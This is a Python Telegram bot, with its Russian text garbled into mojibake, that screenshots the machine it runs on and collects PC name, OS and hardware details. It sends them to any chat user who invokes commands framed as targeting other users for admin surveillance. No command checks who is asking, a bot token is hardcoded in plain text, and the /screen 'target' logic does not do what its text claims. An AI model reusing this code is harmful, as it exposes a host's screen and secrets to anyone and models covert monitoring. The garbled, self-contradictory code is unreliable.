import json
import os
import platform
import subprocess
from datetime import datetime
from PIL import ImageGrab
import psutil
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
TOKEN = "7247434031:AAGEoy4khlG5EMUU0l0gQtBkTkk5Pl2uubY"
DATA_FILE = "user_data.json"
SCREENSHOT_DIR = "screenshots"
TARGETS_FILE = "targets.json"

# –°–æ–∑–¥–∞—ë–º –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –∏ —Ñ–∞–π–ª—ã
os.makedirs(SCREENSHOT_DIR, exist_ok=True)


class TargetManager:
    @staticmethod
    def load_targets():
        try:
            with open(TARGETS_FILE, "r") as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {}

    @staticmethod
    def save_targets(targets):
        with open(TARGETS_FILE, "w") as f:
            json.dump(targets, f, indent=4)

    @staticmethod
    def add_target(admin_id, target_id):
        targets = TargetManager.load_targets()
        targets[str(admin_id)] = str(target_id)
        TargetManager.save_targets(targets)

    @staticmethod
    def remove_target(admin_id):
        targets = TargetManager.load_targets()
        if str(admin_id) in targets:
            del targets[str(admin_id)]
            TargetManager.save_targets(targets)
            return True
        return False

    @staticmethod
    def get_target(admin_id):
        targets = TargetManager.load_targets()
        return targets.get(str(admin_id))


class UserDataManager:
    @staticmethod
    def load_data():
        try:
            with open(DATA_FILE, "r") as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {}

    @staticmethod
    def save_data(data):
        with open(DATA_FILE, "w") as f:
            json.dump(data, f, indent=4)

    @staticmethod
    def update_user_data(user_id, username, system_info):
        data = UserDataManager.load_data()
        user_id_str = str(user_id)

        if user_id_str not in data:
            data[user_id_str] = {
                "username": username,
                "first_seen": datetime.now().isoformat(),
                "request_count": 0,
                "system_info": {},
                "history": []
            }

        data[user_id_str]["request_count"] += 1
        data[user_id_str]["last_seen"] = datetime.now().isoformat()
        data[user_id_str]["system_info"] = system_info
        data[user_id_str]["history"].append({
            "timestamp": datetime.now().isoformat(),
            "system_info": system_info
        })

        UserDataManager.save_data(data)
        return data[user_id_str]


def get_gpu_info():
    """–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–µ –º–µ—Ç–æ–¥—ã –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ GPU"""
    try:
        result = subprocess.run(['nvidia-smi', '--query-gpu=name', '--format=csv,noheader'],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            return result.stdout.strip().split('\n')[0]

        if platform.system() == "Windows":
            import wmi
            w = wmi.WMI()
            for gpu in w.Win32_VideoController():
                return gpu.Name
    except:
        pass

    return "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å"


def get_system_info():
    ram = psutil.virtual_memory()
    ram_total = ram.total / (1024 ** 3)
    ram_available = ram.available / (1024 ** 3)

    return {
        "pc_name": platform.node(),
        "os": f"{platform.system()} {platform.release()}",
        "cpu": platform.processor(),
        "gpu": get_gpu_info(),
        "ram_total": f"{ram_total:.1f} GB",
        "ram_available": f"{ram_available:.1f} GB"
    }


async def send_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        screenshot_path = os.path.join(SCREENSHOT_DIR,
                                       f"screenshot_{update.effective_user.id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
        ImageGrab.grab().save(screenshot_path, "PNG")

        system_info = get_system_info()
        message = (
            "üñ•Ô∏è <b>–°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</b> üñ•Ô∏è\n\n"
            f"üîç <b>–ò–º—è –ü–ö:</b> {system_info['pc_name']}\n"
            f"üè∑Ô∏è <b>–û–°:</b> {system_info['os']}\n"
            f"‚öôÔ∏è <b>–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä:</b> {system_info['cpu']}\n"
            f"üéÆ <b>–í–∏–¥–µ–æ–∫–∞—Ä—Ç–∞:</b> {system_info['gpu']}\n"
            f"üß† <b>–û–ó–£:</b> {system_info['ram_total']} (–î–æ—Å—Ç—É–ø–Ω–æ: {system_info['ram_available']})\n"
            f"‚è∞ <b>–í—Ä–µ–º—è –∑–∞–ø—Ä–æ—Å–∞:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )

        username = update.effective_user.username or update.effective_user.full_name
        UserDataManager.update_user_data(update.effective_user.id, username, system_info)

        with open(screenshot_path, "rb") as photo:
            await context.bot.send_photo(
                chat_id=update.effective_chat.id,
                photo=photo,
                caption=message,
                parse_mode="HTML"
            )

        os.remove(screenshot_path)

    except Exception as e:
        await update.message.reply_text(f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {str(e)}")


async def list_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        data = UserDataManager.load_data()
        if not data:
            await update.message.reply_text("üì≠ –ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è—Ö")
            return

        keyboard = []
        for user_id, user_data in data.items():
            btn_text = f"{user_data['username']} (ID: {user_id})" if user_data.get(
                'username') else f"Unknown (ID: {user_id})"
            keyboard.append([InlineKeyboardButton(btn_text, callback_data=f"user_{user_id}")])

        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "üë• <b>–°–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:</b>",
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

    except Exception as e:
        await update.message.reply_text(f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {str(e)}")


async def user_detail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = query.data.split("_")[1]
    data = UserDataManager.load_data()
    user_data = data.get(user_id)

    if not user_data:
        await query.edit_message_text("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω")
        return

    info = user_data["system_info"]
    message = (
        "üîç <b>–î–µ—Ç–∞–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</b> üîç\n\n"
        f"üë§ <b>–ò–º—è:</b> {user_data['username'] or '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n"
        f"üÜî <b>ID:</b> {user_id}\n"
        f"üìÖ <b>–ü–µ—Ä–≤—ã–π –∑–∞–ø—Ä–æ—Å:</b> {datetime.fromisoformat(user_data['first_seen']).strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"‚è∞ <b>–ü–æ—Å–ª–µ–¥–Ω–∏–π –∑–∞–ø—Ä–æ—Å:</b> {datetime.fromisoformat(user_data['last_seen']).strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"üî¢ <b>–í—Å–µ–≥–æ –∑–∞–ø—Ä–æ—Å–æ–≤:</b> {user_data['request_count']}\n\n"
        "üñ•Ô∏è <b>–°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:</b>\n"
        f"  ‚Ä¢ –ò–º—è –ü–ö: {info['pc_name']}\n"
        f"  ‚Ä¢ –û–°: {info['os']}\n"
        f"  ‚Ä¢ –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä: {info['cpu']}\n"
        f"  ‚Ä¢ –í–∏–¥–µ–æ–∫–∞—Ä—Ç–∞: {info['gpu']}\n"
        f"  ‚Ä¢ –û–ó–£: {info['ram_total']} (–î–æ—Å—Ç—É–ø–Ω–æ: {info['ram_available']})"
    )

    await query.edit_message_text(text=message, parse_mode="HTML")


async def target_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message.reply_to_message:
            await update.message.reply_text("‚ÑπÔ∏è –ù—É–∂–Ω–æ –æ—Ç–≤–µ—Ç–∏—Ç—å –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∫–æ–º–∞–Ω–¥–æ–π /target")
            return

        target_id = update.message.reply_to_message.from_user.id
        admin_id = update.effective_user.id

        TargetManager.add_target(admin_id, target_id)
        await update.message.reply_text(
            f"üéØ –¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –∫–æ–º–∞–Ω–¥—É /screen –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {target_id}\n"
            f"–ß—Ç–æ–±—ã –æ—Ç–º–µ–Ω–∏—Ç—å, –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ /untarget"
        )
    except Exception as e:
        await update.message.reply_text(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –≤ /target: {str(e)}")


async def untarget_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        admin_id = update.effective_user.id

        if TargetManager.remove_target(admin_id):
            await update.message.reply_text("üéØ –†–µ–∂–∏–º target –æ—Ç–∫–ª—é—á—ë–Ω")
        else:
            await update.message.reply_text("‚ÑπÔ∏è –í—ã –Ω–µ –Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤ —Ä–µ–∂–∏–º–µ target")
    except Exception as e:
        await update.message.reply_text(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –≤ /untarget: {str(e)}")


async def screen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ü–æ–≤—Ç–æ—Ä—è–µ—Ç —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª /send_data –¥–ª—è –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    try:
        admin_id = update.effective_user.id
        target_id = TargetManager.get_target(admin_id)

        if not target_id:
            await update.message.reply_text("‚ÑπÔ∏è –°–Ω–∞—á–∞–ª–∞ –≤—ã–±–µ—Ä–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —á–µ—Ä–µ–∑ /target")
            return

        # –î–µ–ª–∞–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç
        screenshot_path = os.path.join(SCREENSHOT_DIR,
                                       f"screenshot_{target_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
        ImageGrab.grab().save(screenshot_path, "PNG")

        # –ü–æ–ª—É—á–∞–µ–º —Å–∏—Å—Ç–µ–º–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
        system_info = get_system_info()

        # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ (–∫–∞–∫ –≤ /send_data)
        message = (
            "üñ•Ô∏è <b>–°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è (–ø–æ –∑–∞–ø—Ä–æ—Å—É –∞–¥–º–∏–Ω–∞)</b> üñ•Ô∏è\n\n"
            f"üîç <b>–ò–º—è –ü–ö:</b> {system_info['pc_name']}\n"
            f"üè∑Ô∏è <b>–û–°:</b> {system_info['os']}\n"
            f"‚öôÔ∏è <b>–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä:</b> {system_info['cpu']}\n"
            f"üéÆ <b>–í–∏–¥–µ–æ–∫–∞—Ä—Ç–∞:</b> {system_info['gpu']}\n"
            f"üß† <b>–û–ó–£:</b> {system_info['ram_total']} (–î–æ—Å—Ç—É–ø–Ω–æ: {system_info['ram_available']})\n"
            f"‚è∞ <b>–í—Ä–µ–º—è –∑–∞–ø—Ä–æ—Å–∞:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç –∏ –¥–∞–Ω–Ω—ã–µ
        with open(screenshot_path, "rb") as photo:
            await context.bot.send_photo(
                chat_id=update.effective_chat.id,
                photo=photo,
                caption=message,
                parse_mode="HTML"
            )

        # –û–±–Ω–æ–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (–µ—Å–ª–∏ –æ–Ω –µ—Å—Ç—å –≤ –±–∞–∑–µ)
        user_data = UserDataManager.load_data().get(str(target_id))
        if user_data:
            UserDataManager.update_user_data(int(target_id), user_data['username'], system_info)

        # –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
        os.remove(screenshot_path)

    except Exception as e:
        await update.message.reply_text(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –≤ /screen: {str(e)}")


def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("send_data", send_data))
    application.add_handler(CommandHandler("list_check", list_check))
    application.add_handler(CommandHandler("target", target_user))
    application.add_handler(CommandHandler("untarget", untarget_user))
    application.add_handler(CommandHandler("screen", screen_command))
    application.add_handler(CallbackQueryHandler(user_detail, pattern="^user_"))

    application.run_polling()


if __name__ == "__main__":
    main()